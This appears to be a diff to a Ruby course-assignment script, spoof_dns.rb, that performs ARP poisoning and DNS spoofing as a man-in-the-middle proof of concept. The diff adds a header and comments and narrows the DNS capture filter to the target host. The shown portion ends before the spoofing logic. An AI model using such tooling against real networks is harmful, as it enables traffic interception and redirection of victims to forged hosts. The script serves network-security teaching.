@@ -1,11 +1,32 @@
 #!/usr/bin/env ruby
-
+=begin
+-------------------------------------------------------------------------------------
+--  SOURCE FILE:    spoof_dns.rb - Proof of concept application for arp poisoning and
+--                                 DNS spoofing. Application acts as MITM sniffer 
+--                                 for DNS traffic and injects crafted DNS responses
+--                                 when a query is intercepted.
+--
+--  PROGRAM:        spoof_dns
+--                  ./spoof_dns.rb
+--
+--  FUNCTIONS:      Crafted UDP packets, libpcap, multi-threading
+--
+--  Ruby Gems required:     packetfu
+--                          https://rubygems.org/gems/packetfu
+--                      
+--  DATE:           May/June 2014
+--
+--  REVISIONS:      See development repo: https://github.com/deuterium/comp8505-assign3
+--
+--  DESIGNERS:      Chris Wood - chriswood.ca@gmail.com
+--
+--  PROGRAMMERS:    Chris Wood - chriswood.ca@gmail.com
+--  
+--  NOTES:          This builds on the ARP poisoning examples from class.
+---------------------------------------------------------------------------------------
+=end
 require 'packetfu'
 require 'thread'
-
-# Builds on the previous ARP spoofing example.
-# The sending of ARP packets is done in a separate thread. 
-
 
 ## User defined variables
 @target_ip   = "192.168.1.100"  # IP of the host you would like to target
@@ -18,7 +39,15 @@ require 'thread'
 @iface       = "wlp2s0"         # Name of the primary network interface 
 
 ## DO NOT EDIT BELOW THIS LINE
-# Functions
+## Functions
+
+# Starts the arp spoofing thread. Sends out crafted packets
+# to the telling the router that this mac is the client, and
+# to the client telling it that it is the router.
+# @param [String] arp_packet_target
+# - Crafted UDP packet for target
+# @param [String] arp_packet_router
+# - Crafted UDP packet for router
 def runspoof(arp_packet_target,arp_packet_router)
   # Send out both packets
   puts "ARP Posioning Thread Started"
@@ -30,15 +59,13 @@ def runspoof(arp_packet_target,arp_packet_router)
   end
 end
 
-def get_machine_addr(ip)
-  PacketFu::Utils.arp(ip, :iface => @iface)
-end
-
+# Starts the DNS sniffing and spoofing thread.
+# Looks for 
 def spoof_dns(t_ip)
   puts "DNS Spoofing Thread Started"
   #look for dns packets from target
-  #filter = "udp and port 53 and src " + t_ip
-  filter = "udp and port 53"
+  filter = "udp and port 53 and src " + t_ip
+  #filter = "udp and port 53"
 
   begin
   cap = PacketFu::Capture.new(:iface => @iface,
